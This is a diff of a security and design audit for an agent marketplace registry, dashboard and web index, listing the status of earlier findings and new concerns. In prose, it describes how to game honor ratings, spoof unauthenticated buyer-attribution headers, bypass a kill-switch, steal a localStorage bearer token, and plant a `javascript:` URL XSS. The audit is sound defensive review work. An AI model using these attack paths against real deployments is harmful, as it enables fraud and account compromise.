-| Buyer rating (`/sellers/:pubkey/rate`)| ≥1 prior tx (30d)   | N=0 tx: 403 `"no transaction with this seller in the last 30 days"`. Cold-start pathological — first-week sellers have no ratings until they cycle. |
-| Subscriptions                         | ≥1 subscriber + watcher | N=0 subscribers: watcher loop ticks for nothing. Real-mode: GitHub API rate-limited; no auth header set in `fetchRealAdvisories`. |
-| Dataset marketplace                   | ≥1 dataset          | One dataset is shipped; no second seller exists; no ranking signal between datasets. |
-| Slashing / dispute                    | Any reviewer to slash | N=0 unprocessed reviews: 404. Dispute path unauthenticated for buyer-of-record (anyone signed can dispute), so this lights up before liquidity does — wrong cold-start signal. |
-| Platform-fee revenue                  | ≥1 settled tx       | Counter only; no payout pipe; no liquidity needed because no money flows. |
+Unchanged from prior audit; new entries for post-rebrand surfaces.
 
-**Concentrated risks at N≈1:**
+| Feature                                | Liquidity required | N=0 / N=1 behaviour |
+|----------------------------------------|--------------------|---------------------|
+| Orchestrator `recommend`               | ≥1 service         | N=1 → `intent_match` dominates trivially. |
+| Search                                 | ≥1 service         | N=0 → empty list. |
+| Honor ranking                          | ≥1 honor signal    | All start at 0; `maxHonor=1` forced; honor weight is dead weight in v0. |
+| Peer review                            | ≥2 distinct pubkeys | "weighted random" meaningless at N=1; ADR's blindness claim doesn't hold below 2–3 reviewers. |
+| Buyer rating                           | ≥1 prior tx (30d)  | First-week sellers can't be rated; bootstrapping requires off-system trust. |
+| Subscriptions                          | ≥1 subscriber      | Watcher loops idle. |
+| Dataset marketplace                    | ≥1 dataset         | Single seller, no ranking signal between datasets. |
+| Slashing / dispute                     | Any reviewer       | Dispute path fires before liquidity does (anyone signed can dispute) — wrong cold-start signal. |
+| Platform-fee revenue                   | ≥1 settled tx      | Counter only; no payout pipe. |
+| **Public web index `aggregateStats`**  | ≥1 seller          | N=0 sellers → header reads `Sellers — / Services — / Transactions — / Sats moved —`. Acceptable. |
+| **Dashboard SPA `/sellers` proxy**     | Registry online    | Registry down → proxy returns 502; SPA shows error block. Acceptable. |
+| **Dashboard SPA balance**              | NWC reachable (real mode) or always-mock | Real-mode + NWC unreachable → balance object with `error` and `null` sats. |
 
-- C-1. **Single seller per type → orchestrator collapses to "the only
-  option."** The 60/20/20 ranking is theatrical at N=1.
-- C-2. **Single reviewer → blind assignment is predictable.** With one
-  reviewer in the pool, every request lands on them. `pickRandomReviewer`
-  is honest about it but the design pretends randomness is a property.
-- C-3. **First buyer can't rate first seller** without a prior tx; first
-  tx cannot be rated (the rating is per-tx in concept but per-seller in
-  schema). Bootstrapping reputation requires an off-system trust bridge.
+Concentrated-at-N≈1 risks: same as before (orchestrator collapses,
+single reviewer is the only option, first buyer can't rate first
+seller). The new public web surface makes these failure modes more
+visible, not worse.
 
 ---
 
 ## 6. Moat-test results per seller type
 
-The audit prompt references a "make-vs-buy-vs-spawn" framework. **No
-documented framework exists in `docs/decisions/`**, in the README, or in
-the CHANGELOG. I infer the prompt's intent: each agent-built seller should
-sell something a buyer agent could not trivially do itself or buy
-elsewhere. I evaluate against that inferred standard.
+The "make-vs-buy-vs-spawn" framework is still not documented in the
+codebase; I evaluate against the inferred standard.
 
-| Seller            | Sells                                | "Make-it-yourself" cost | "Buy from existing API" alternative | Moat as built |
-|-------------------|--------------------------------------|--------------------------|--------------------------------------|---------------|
-| `vision-oracle-3` (provider) | OSM-geocoded listing verification + signed receipt | OSM Nominatim is free, ~1 line of code | Direct Nominatim usage | **WEAK.** The signed proof + L402 demonstration is the moat (no Nominatim caller signs). 240 sat for what is effectively a free API call wrapped in a signature is justifiable as "trust amortization", not as data scarcity. |
-| `market-monitor` (advisory subscriptions) | GHSA advisories with debounced delivery + filter config | GitHub publishes advisories.json for free; `fetchRealAdvisories` literally calls the public endpoint | Direct GitHub API + cron | **VERY WEAK as built.** The fixture mode dominates the test surface; real-mode `fetchRealAdvisories` does not authenticate (60 req/h public limit), no ETag caching, no value-add beyond "we already wrote the cron." The seller's moat reduces to "the buyer doesn't want to run a watcher loop." |
-| `dataset-seller` (NOAA PNW 2015-25) | A specific historical weather archive | NOAA itself publishes the underlying data for free via opendata.aws + NCEI | Wget + S3 cli | **MOAT-IS-PROVENANCE.** The ADR claims provenance + curated rows + signed-URL delivery. As implemented: a 20 KB JSON fixture, no signing of the *contents*, no provenance attestation beyond a `source` string. The moat the ADR promises is not the moat the code delivers. |
-| Reviewer (peer review) | Independent rubric assessment + slashing-backed honesty | Hire any human or LLM judge | Trust-as-a-service is novel; no obvious off-the-shelf | **WEAK.** Slashing is the moat — but slashing is fictitious money (D2/D3) on a default-secret HMAC log (D-4). At v0 the moat is honor points with no economic teeth. |
+| Seller            | Sells                                              | Make-it-yourself cost            | Buy-from-existing-API alternative    | Moat as built |
+|-------------------|----------------------------------------------------|----------------------------------|--------------------------------------|---------------|
+| `vision-oracle-3` | OSM-geocoded listing verify + signed receipt       | OSM Nominatim is free            | Direct Nominatim                     | **WEAK.** Moat is the L402 demo + signed proof, not the data. |
+| `market-monitor`  | GHSA advisories + filter + debounced delivery       | GitHub publishes advisories.json | Direct GitHub + cron                 | **VERY WEAK.** No auth, no ETag caching; "we already wrote the cron" is the only value. |
+| `dataset-seller`  | NOAA PNW 2015–25                                   | NOAA opendata + S3 cli           | Wget                                 | **PROMISED-NOT-DELIVERED.** Provenance + signed contents are ADR claims; code serves a 20 KB JSON fixture in both modes. |
+| Reviewer          | Independent rubric + slashing-backed honesty       | Hire any LLM judge               | None off-the-shelf                   | **CONDITIONAL.** Slashing teeth are fictitious money on a default-secret HMAC log; moat depends on a settlement layer that doesn't exist. |
+| **Web index (`web/`)** | Read-only browse over the registry             | The registry's own JSON endpoints | A tab with `curl` + `jq`             | **N/A — not a paid seller.** Moat is UX (a pretty page over public data); it doesn't gate any payment. |
+| **Dashboard SPA** | Local-only kill-switch UI + tx log                 | Curl the control plane           | Doesn't apply (per-host human tool)  | **N/A — local utility.** Moat is convenience, not economics. |
 
-**Drift summary:**
-
-- Provider: **moat held**, but only because the demo intent is the L402
-  protocol itself, not the data.
-- Market-monitor: **moat eroded.** The cost the seller saves the buyer is
-  cron + filter config — easily replicated.
-- Dataset: **moat promised, not delivered.** Real-mode parquet, signed
-  contents, and provenance proofs would deliver it; the JSON fixture does
-  not.
-- Reviewer: **moat depends on a settlement layer that doesn't exist.**
+Drift summary unchanged: provider holds (because the demo intent IS
+the protocol), market-monitor erodes, dataset is promised-not-built,
+reviewer depends on a missing settlement layer.
 
 ---
 
-## 7. Top 5 design concerns (ranked by severity)
+## 7. Status of previous audit's top 5 concerns
+
+| # | Concern                                                                          | Status   | Notes |
+|---|----------------------------------------------------------------------------------|----------|-------|
+| 1 | CRITICAL — honor unbounded and trivially gamed (no per-(buyer,seller) UNIQUE)    | **STILL** | `rateSeller` is byte-for-byte unchanged. ADR 0010 is not amended. |
+| 2 | CRITICAL — review economics decorative (no Lightning escrow / payouts / slashing)| **STILL** | Build-summary §6.4 still admits this. No `reviewer_owed` table; HMAC default secret still committed. |
+| 3 | HIGH — buyer attribution on tx records unauthenticated                            | **SHIFTED (worse)** | Header chain widened to `x-agora-* ?? x-andromeda-* ?? x-lumen-*` post-ADR 0013. Three names now spoofable; ADR 0013 doesn't analyze the trade-off. |
+| 4 | HIGH — "blind" reviewer assignment isn't blind, "random" isn't verifiable        | **STILL** | `pickRandomReviewer` + `getReviewerAssignments` unchanged. |
+| 5 | HIGH — 2% platform fee is a counter, not a payout                                | **STILL** | `platform_fee_sats` still seller-supplied; no `PLATFORM_NWC_URL` payout wired. |
+
+Net: **0 of 5 addressed**, **1 shifted (worse)**, **4 unchanged**.
+
+---
+
+## 8. Top 5 design concerns (post-rebrand, ranked by severity)
 
 ### S1 — CRITICAL · Honor system is unbounded and trivially gamed
 
-`POST /sellers/:pubkey/rate` has no per-buyer-per-seller uniqueness
-constraint. Any buyer with one ≥1-sat tx in the last 30 days can call
-`rate(stars=5)` an unbounded number of times. `UPDATE sellers SET honor =
-honor + ?` runs every call. A single-tx attacker can move any seller's
-honor by ±2 per request. This is the highest-severity finding because
-honor is the input to (a) the orchestrator's 20% ranking weight and (b)
-reviewer weighting in `pickRandomReviewer`. Game one rating loop, win the
-review queue.
+Unchanged from previous audit; still rank-1. `POST /sellers/:pubkey/rate`
+has no per-(buyer, seller) UNIQUE constraint. One 240-sat purchase
+buys an attacker an unbounded honor-rating loop. Honor feeds (a) the
+orchestrator's 20% ranking weight and (b) reviewer pick-weighting in
+`pickRandomReviewer`. Game one rating loop, win the review queue.
 
 ### S2 — CRITICAL · Review economics are decorative
 
-ADR 0010's escrow + platform cut + reviewer payout + slashing are all
-counter-only. No `reviewer_owed` ledger, no Lightning payouts, no escrow
-collection. The slashing audit log is HMAC-signed with a string committed
-to the source as a default fallback. A buyer agent depending on
-"peer-reviewed = trustworthy" is depending on a number with no
-cryptographic or economic backing in v0. The honest scope (build-summary
-§4–6) admits this; the public docs (PAYMYAGENT.md, README) do not.
+Unchanged. Escrow is a number on a row; `reviewer_payout_sats` is a
+JSON field with no ledger backing; slashing audit log uses a
+default-fallback HMAC string that is committed to the source. The
+PayMyAgent narrative invokes "trust + slashing" as a feature; the
+implementation is bookkeeping with no money behind it.
 
-### S3 — HIGH · Buyer attribution on tx records is unauthenticated
+### S3 — HIGH · ADR 0013 widened the buyer-attribution header surface, not narrowed it
 
-`recordTransaction` accepts a `buyer_pubkey` field signed by the seller.
-The seller can write any pubkey; nothing on the buyer side ever signs.
-This breaks: (a) the rate-seller "tx within 30 days" check (sellers can
-fabricate tx history for shill buyers), (b) per-buyer analytics, (c) any
-future tx-based privilege (e.g. "must have spent N sats with this seller"
-gating). The fix would require buyer-side signed attestations on settle —
-not in scope today, but the design does not call this out.
+The post-rebrand naked-attribution chain on every paid endpoint
+accepts `x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey`. None
+of these are authenticated. An attacker can attribute *any* purchase
+to *any* victim pubkey by sending the right header. The previous
+audit rated this HIGH at one header; ADR 0013 made it three. Combined
+with S1, this means: a single attacker can rate up any seller using
+any victim pubkey as the "buyer," skipping even the 30-day tx-history
+gate (because they can fabricate the tx attribution themselves on a
+single 240-sat purchase). ADR 0013 doesn't discuss the trade-off; the
+phase-1b test passes the wrong way (C-6).
 
-### S4 — HIGH · "Blind" reviewer assignment is not blind, and "random" is unverifiable
+### S4 — HIGH · Registry's signed-write gate silently rejects two of the three header families it claims to accept
 
-The reviewer trivially derives the subject pubkey from `subject_pubkey`
-on the assignment row (returned by `/reviews/assigned`). The randomness
-of the pick is unverifiable — no commit-reveal, no on-chain seed, no
-published `last_assigned_at` audit. The registry is a trusted oracle for
-the entire reviewer-fairness story. ADR 0010 markets this as if it were
-a primitive; it is policy-by-server-code.
+ADR 0013 §"Signed-request HTTP headers" says the verifier accepts all
+three header families on incoming. `registry/src/lib/sig.ts:16` does
+a manual pre-check using only the `x-agora-*` constants, returning
+`401 missing signature headers` before delegating to
+`verifyRequest()` (which itself does the right thing). Outcome: any
+buyer that signed with `x-andromeda-*` or `x-lumen-*` headers is
+rejected, contradicting the rebrand's explicit backwards-compat
+promise. The test asserts 401 on tampered headers but does not
+distinguish reasons, so the regression-shaped pass.
 
-### S5 — HIGH · Two-step platform fee is sold as a feature, exists as a counter
+### S5 — HIGH · Dashboard kill-switch isn't enforced on control-plane proxy endpoints, and the bearer token is in `localStorage`
 
-ADR 0008 and the PayMyAgent narrative invoke the 2% platform fee as
-infrastructure. The implementation is `platform_fee_sats = round(amt *
-0.02)` written into a SQLite column by the seller, with no payout. The
-"platform" never receives sats; the seller keeps 100% of gross. A future
-auditor or partner reading the ADR will assume revenue is collected; it
-isn't.
+Two distinct issues that compound:
+
+(a) ADR 0011 §3 promises the kill-switch will refuse to proxy
+registry calls; the implementation only checks kill-switch inside
+`budget.js::reserve()`. The five proxy endpoints (`/balance`,
+`/transactions`, `/subscriptions`, `/subscriptions/:id/cancel`,
+`/sellers`) bypass it. `POST /subscriptions/:id/cancel` is a
+*write* not gated by either kill-switch or budget; the dashboard UI
+copy ("every paid MCP tool refuses with `kill_switch_active`") is
+misleading.
+
+(b) The dashboard SPA stores the control-plane bearer token in
+`localStorage` (`controlPlane.ts:9-46`). Any same-origin XSS — or any
+malicious browser extension on `localhost:5173` — leaks a token with
+unconditional control-plane authority. ADR 0011 chose `localStorage`
+implicitly (no discussion of token storage security in §4 "state
+store"). Combined with (a), a leaked token enables silent
+subscription cancellation that the user's "halt" cannot stop.
+
+### Honourable mention · `<a href={seller.url}>` is a `javascript:`-URL XSS vector in the public web index
+
+Not in the top 5 because it requires (i) a malicious seller, (ii) a
+human visitor clicking, and (iii) ignoring rel=noopener (which is
+present). But: the registry doesn't validate the URL scheme on
+registration, the web app doesn't validate it on render. A seller
+who registers `url: "javascript:..."` will execute script in any
+clicker's browser at the `localhost:3300` (or production) origin.
+ADR 0012's trust-boundary discussion doesn't mention scheme
+validation; this is the *direct* gap the audit prompt asked about.
+HIGH if any production deployment exists; MEDIUM in the demo as
+shipped.
 
 ---
 
-## Appendix · Files inspected
+## Appendix · Files inspected (post-rebrand)
 
-- `README.md`, `PAYMYAGENT.md`, `CHANGELOG.md`
-- `docs/decisions/0001..0010-*.md`, `docs/BUILD-SUMMARY.md`
-- `registry/migrations/0001-initial.sql`, `0002-honor-decay.sql`
-- `registry/src/lib/db.ts`, `registry/src/lib/reviews.ts`,
-  `registry/src/lib/sig.ts`, `registry/src/lib/embeddings.ts`
-- `registry/src/app/api/v1/transactions/record/route.ts`
-- `registry/src/app/api/v1/sellers/register/route.ts`
-- `registry/src/app/api/v1/sellers/[pubkey]/route.ts`
-- `registry/src/app/api/v1/sellers/[pubkey]/rate/route.ts`
-- `registry/src/app/api/v1/reviews/request/route.ts`
-- `registry/src/app/api/v1/reviews/[id]/submit/route.ts`
-- `registry/src/app/api/v1/reviews/[id]/dispute/route.ts`
-- `registry/src/app/api/v1/reviewers/availability/route.ts`
-- `registry/src/app/api/v1/orchestrator/recommend/route.ts`
-- `registry/src/app/api/v1/admin/decay/route.ts`,
-  `…/admin/fast-forward/route.ts`, `…/platform/revenue/route.ts`
-- `provider/src/lib/registry-client.ts`
-- `agents/market-monitor/src/server.js`,
+In addition to the previous audit's set:
+
+- `dashboard/src/App.tsx`, `dashboard/src/lib/store.ts`,
+  `dashboard/src/lib/controlPlane.ts`, `dashboard/src/components/Allowance.tsx`,
+  `dashboard/src/components/Setup.tsx`
+- `mcp/control-plane.js`, `mcp/budget.js`
+- `web/src/app/layout.tsx`, `web/src/app/page.tsx`,
+  `web/src/app/sellers/page.tsx`, `web/src/app/sellers/[pubkey]/page.tsx`,
+  `web/src/app/services/[id]/page.tsx`, `web/src/app/search/page.tsx`,
+  `web/src/lib/registry.ts`, `web/src/components/pubkey.tsx`
+- `packages/agora-core/src/signed-request.ts`
+- `registry/src/lib/sig.ts`, `registry/src/lib/db.ts`,
+  `registry/src/lib/reviews.ts`,
+  `registry/src/app/api/v1/sellers/register/route.ts`,
+  `registry/src/app/api/v1/transactions/record/route.ts`,
+  `registry/src/app/api/v1/sellers/[pubkey]/rate/route.ts`,
+  `registry/src/app/api/v1/reviews/[id]/dispute/route.ts`
+- `provider/src/app/api/v1/listing-verify/route.ts`,
   `agents/dataset-seller/src/server.js`
-- `mcp/server.js`
-- `packages/andromeda-core/src/signed-request.ts`,
-  `packages/andromeda-core/src/index.ts`
-- `scripts/test-phase{0,1b,2,3,4,5,6}.js`
+- `docs/decisions/0001..0013-*.md`, `docs/BUILD-SUMMARY.md`,
+  README.md, PAYMYAGENT.md
 
-No code was modified. No tests were run.
+No code modified. No tests run.
